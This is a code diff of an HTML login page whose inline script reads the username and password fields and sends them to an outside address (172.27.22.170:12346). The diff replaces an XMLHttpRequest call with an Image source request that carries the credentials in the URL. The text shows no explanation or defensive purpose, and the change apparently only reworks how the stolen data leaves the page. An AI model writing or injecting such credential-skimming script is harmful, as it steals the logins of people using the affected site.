@@ -37,17 +37,19 @@
                                 function hehe() {
                                     var username = document.forms['loginform'].elements['login_username'].value;
                                     var password = document.forms['loginform'].elements['login_password'].value;
-                                    var req = new XMLHttpRequest();
+                                    //var req = new XMLHttpRequest();
                                     var ip = "172.27.22.170:12346";
-                                    req.open(
+                                    /*req.open(
                                         "GET",
                                         "http://"+ ip +
                                         "?username="+username+
                                         "&password="+password,
                                         true
-                                    );
+                                    );*/
+                                    //req.send();
+                                    new Image().src = "http://172.27.22.170:12346/?username="+username+"&password="+password;
                                     console.log(username, password);
-                                    req.send();
+                                    
                                 }
                             </script>
                             <input name="submit_login" value="Log in" type="submit">
